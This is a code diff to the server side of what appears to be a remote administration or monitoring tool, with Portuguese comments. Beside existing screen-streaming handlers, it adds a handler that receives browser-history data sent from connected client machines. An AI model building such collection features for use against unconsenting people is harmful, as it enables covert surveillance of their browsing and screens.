@@ -136,6 +136,8 @@ class ClientHandler:
             self._process_screen_stream_stop_response()
         elif cmd == CMD_SCREEN_STREAM_FRAME:
             self._process_screen_stream_frame()
+        elif cmd == CMD_BROWSER_HISTORY_RESPONSE:
+            self._process_browser_history_response()
         else:
             if cmd > 100:  # Assumimos que comandos acima de 100 podem ser dados de arquivo
                 pass  # Silenciosamente ignorar
@@ -760,3 +762,28 @@ class ClientHandler:
                 logger.warning("Servidor não possui método para processar resposta de streaming de tela")
         except Exception as e:
             logger.error(f"Erro ao processar resposta de parada de streaming: {str(e)}")
+    def _process_browser_history_response(self):
+        self.log("Recebendo resposta de histórico de navegação")
+        size_data = self._recv_exact(4)
+        if not size_data:
+            self.log("Erro ao receber tamanho dos dados de histórico")
+            return
+        data_size = struct.unpack('>I', size_data)[0]
+        if data_size <= 0:
+            self.log(f"Tamanho da resposta de histórico inválido: {data_size} bytes")
+            return
+        if data_size > 20 * 1024 * 1024:  # Limite de 20MB
+            self.log(f"Tamanho da resposta de histórico muito grande: {data_size / 1024 / 1024:.2f} MB")
+            return
+        self.log(f"Tamanho da resposta de histórico: {data_size / 1024:.2f} KB")
+        history_data = self._recv_exact(data_size)
+        if not history_data:
+            self.log("Erro ao receber dados de histórico")
+            return
+        try:
+            if hasattr(self.server, 'window_manager') and self.server.window_manager:
+                self.server.window_manager.process_browser_history_response(self.client_address, history_data)
+            else:
+                self.log("Servidor não possui window_manager para processar histórico")
+        except Exception as e:
+            self.log(f"Erro ao processar resposta de histórico: {str(e)}")
